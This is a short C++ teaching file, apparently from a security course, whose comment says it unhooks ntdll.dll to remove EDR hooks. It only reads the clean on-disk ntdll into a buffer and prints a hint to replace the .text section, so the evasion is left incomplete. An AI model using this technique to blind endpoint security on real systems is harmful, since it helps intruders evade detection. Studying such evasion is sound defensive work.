// Filename: unhook_ntdll.cpp
// Purpose: Replace ntdll.dll in memory with a clean copy from disk to remove EDR hooks.
// Instructor: Joas A Santos - https://www.linkedin.com/in/joas-antonio-dos-santos - https://github.com/CyberSecurityUP

#include <windows.h>
#include <winternl.h>
#include <iostream>
#include <fstream>

int main() {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");

    char path[MAX_PATH];
    GetSystemDirectoryA(path, MAX_PATH);
    strcat_s(path, "\\ntdll.dll");

    HANDLE hFile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        std::cerr << "Failed to open clean ntdll.dll" << std::endl;
        return 1;
    }

    DWORD size = GetFileSize(hFile, NULL);
    LPVOID buffer = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    DWORD read;
    ReadFile(hFile, buffer, size, &read, NULL);
    CloseHandle(hFile);

    std::cout << "Loaded clean ntdll into memory. Replace .text to unhook." << std::endl;

    VirtualFree(buffer, 0, MEM_RELEASE);
    return 0;
}
